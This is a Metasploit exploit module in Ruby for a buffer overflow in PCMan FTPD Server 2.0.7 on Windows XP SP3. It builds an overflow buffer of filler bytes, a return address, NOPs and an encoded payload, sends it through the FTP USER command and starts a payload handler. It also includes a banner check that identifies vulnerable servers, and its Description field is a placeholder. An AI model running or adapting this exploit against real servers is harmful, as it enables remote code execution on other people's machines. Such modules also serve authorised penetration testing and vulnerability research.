##
# This module requires Metasploit
# 
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Ftp

    def initialize(info={})
    super(update_info(info,
      'Name'           => "PCManFTPD Server 2.0.7",
      'Description'    => %q{
        xxx
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Pablo GonzÃ¡lez' # Metasploit module
        ],
      'References'     =>
        [
          ['OSVDB', '96517'],
          ['EDB',   '27747'],
          ['BID',   '61905']
        ],
      'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x0d",
        },
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          ['PCMan FTPD Server 2.0.7 On Windows XP SP3 English',
            {
              'Ret'    => 0x7e429353 #\x53\x93\x42\x7e
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Aug 20 2013",
      'DefaultTarget'  => 0))

    # We're triggering the bug via the PASS command, no point to have pass as configurable
    # option.
    deregister_options('FTPPASS')

  end
  
  def check

    connect
    disconnect
	
    if banner =~ /PCMan\'s FTP Server 2\.0/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe

    end
  end

  def exploit
    
	connect
    print_status("Trying target #{target.name} with user #{user()}...")

	basura = "A"*2001
	ret = [target.ret].pack('V')	#7E429353
	nops = make_nops(16)
	
	bof = basura + ret + nops + payload.encoded
	
	send_user(bof)
	handler
	
    disconnect

  end
end
